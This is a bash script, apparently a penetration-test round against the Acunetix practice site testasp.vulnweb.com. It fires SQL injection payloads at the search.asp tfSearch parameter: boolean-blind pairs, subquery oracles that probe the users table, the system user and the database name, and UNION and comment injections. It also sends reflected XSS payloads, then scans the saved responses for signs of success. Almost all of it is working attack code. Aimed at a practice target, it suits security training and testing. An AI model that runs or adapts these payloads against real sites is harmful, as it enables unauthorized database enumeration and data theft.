#!/usr/bin/env bash
# Round 5 — search.asp SQLi 실증 검증 (boolean-blind + 반사 + UNION)  [읽기 전용 GET]
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; mkdir -p "$OUT"
CURL=(curl -s --noproxy '*' --max-time 25)

run() { # $1=label  $2=tfSearch 값(그대로)  $3=있으면 파라미터 자체 생략
  local label="$1" val="$2" skip="${3:-}"
  local code size
  if [ -n "$skip" ]; then
    read -r code size < <("${CURL[@]}" -o "$OUT/sql_${label}.html" -w "%{http_code} %{size_download}" "$BASE/search.asp")
  else
    read -r code size < <("${CURL[@]}" -G --data-urlencode "tfSearch=$val" \
        -o "$OUT/sql_${label}.html" -w "%{http_code} %{size_download}" "$BASE/search.asp")
  fi
  printf "%-26s %-46s %s %s\n" "$label" "$val" "$code" "$size"
}

echo "### B. /search.asp?tfSearch= — SQLi 오라클 검증"
printf "%-26s %-46s %s %s\n" "LABEL" "tfSearch" "CODE" "SIZE"
run noparam           ""            skip
run empty             ""
run plain_test        "test"
run sq              "zzq'"
echo "-- boolean pair (true/false) --"
run bool_true         "zzq') OR (1=1) OR (''='"
run bool_false        "zzq') OR (1=2) OR (''='"
run bool_true2        "zzq') OR (2>1) OR (''='"
run bool_false2       "zzq') OR (2<1) OR (''='"
echo "-- 서브쿼리 boolean (DB 구조/내용 오라클) --"
run subq_users_gt0    "zzq') OR ((SELECT COUNT(*) FROM users)>0) OR (''='"
run subq_users_gt100  "zzq') OR ((SELECT COUNT(*) FROM users)>100) OR (''='"
run subq_sysuser      "zzq') OR ((SELECT SYSTEM_USER)='acunetix') OR (''='"
run subq_dbnm         "zzq') OR ((SELECT DB_NAME())='acuforum') OR (''='"
run subq_posts_gt0    "zzq') OR ((SELECT COUNT(*) FROM posts)>0) OR (''='"
echo "-- 반사(XSS) 및 UNION --"
run xss_reflect       "<script>alert(1)</script>"
run html_reflect      "\"><img src=x onerror=alert(1)>"
run union_try         "zzq') UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
run comment_try       "zzq' OR 1=1--"
echo
echo "### B2. 결과 분류 (본문 지문)"
python3 - "$OUT" <<'EOF'
import re,sys,os,glob
out=sys.argv[1]
for f in sorted(glob.glob(os.path.join(out,"sql_*.html"))):
    s=open(f,encoding="latin-1",errors="replace").read()
    lab=os.path.basename(f)[4:-5]
    rows=len(re.findall(r"class='posttext'",s))
    searched = "You searched for" in s
    marker=""
    if "alert(1)" in s and ("<script>alert(1)</script>" in s or "onerror=alert(1)" in s): marker="REFLECTED-RAW"
    print(f"{lab:22} {len(s):6}B rows={rows:3} searched={int(searched)} {marker}")
EOF
